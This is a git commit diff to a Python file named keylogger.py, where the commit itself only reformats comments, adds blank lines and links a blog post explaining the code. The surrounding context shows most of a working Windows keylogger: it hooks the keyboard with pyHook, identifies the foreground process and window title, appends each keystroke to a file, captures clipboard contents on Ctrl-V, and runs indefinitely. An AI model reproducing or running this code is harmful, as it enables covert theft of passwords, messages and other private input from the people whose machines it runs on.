fed0804102f1aab77a64684f9cef903f92114258
zedxpace <52217313+zedxpace@users.noreply.github.com>
2021-11-05 00:04:22 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,4 @@
-
+##Find the explanation of the code in following link : https://codexpace.blogspot.com/2021/11/python-keylogger.html
 from ctypes import *
 import pythoncom
 import pyHook
@@ -14,21 +14,25 @@ current_window = None
 
 
 def get_current_process():
-    #Get a handle to the foreground window
+    ##Get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
     print("hwnd",hwnd)
-    #Find Process id
+    
+    ##Find Process id
     pid = c_ulong()
     print("pid",pid)
     user32.GetWindowThreadProcessId(hwnd ,byref(pid))
-    #store the current process ID
+    
+    ##store the current process ID
     process_id = pid.value
     print("processid",process_id)
-    #grab the executable
+    
+    ##grab the executable
     executable = create_string_buffer (b'\x00',512)
     h_process = kernel32.OpenProcess(0x400 | 0x10 ,False ,pid)
     psapi.GetModuleBaseNameA(h_process ,None ,byref(executable) ,512)
-    #now read its title
+    
+    ##now read its title
     window_title = create_string_buffer(b"\x00",512)
     print(window_title , executable ,process_id ,hwnd)
     length = user32.GetWindowTextA(hwnd ,byref(window_title) ,512)
@@ -46,13 +50,16 @@ def get_current_process():
     #close handles
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
+
 def Keystroke(event ):
     global current_window
-    #check to see if target changed windows
+    
+    ##check to see if target changed windows
     if event.WindowName != current_window :
         current_window = event.WindowName
         get_current_process()
-    #if they pressed a standard key
+    
+    ##if they pressed a standard key
     if event.Ascii in range(32 ,128) :
         print(chr(event.Ascii))
         h = chr(event.Ascii)
@@ -60,7 +67,7 @@ def Keystroke(event ):
         file.write("%s"%h)
         file.close()
     else :
-        #if [CTRL-V] ,get the value on the clipboard
+        ##if [CTRL-V] ,get the value on the clipboard
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
@@ -78,9 +85,10 @@ def Keystroke(event ):
     return True
 
 
-#create and register a hook manager
+##create and register a hook manager
 k1 = pyHook.HookManager()
 k1.KeyDown = Keystroke
-#register the hook and execute forever
+
+##register the hook and execute forever
 k1.HookKeyboard()
 pythoncom.PumpMessages()
